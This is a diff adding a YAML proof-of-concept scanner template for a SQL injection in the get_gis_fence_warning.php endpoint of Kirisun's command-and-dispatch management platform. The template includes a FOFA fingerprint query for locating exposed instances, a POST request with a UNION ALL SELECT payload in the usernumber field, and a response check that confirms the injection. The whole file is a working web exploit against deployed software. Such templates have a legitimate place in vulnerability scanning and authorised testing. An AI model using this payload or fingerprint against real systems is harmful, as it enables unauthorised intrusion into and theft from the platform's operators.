@@ -1,0 +1,32 @@
+id: poc-yaml-kirisun-csmp-get-gis-fence-warning-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 get_gis_fence_warning SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/client/get_gis_fence_warning.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: usernumber=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7e,IFNULL(CAST(MD5({{.t1}})
+    AS CHAR),0x7e),0x7e),NULL,NULL,NULL,NULL,NULL-- -
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"header\":") &&
+
+    contains(body,"\"gis_wd\":") &&
+
+    contains(body,"\"warning\":") &&
+
+    contains(body,t2) &&
+
+    !contains(body,"<")
+
+    '
+transport: http
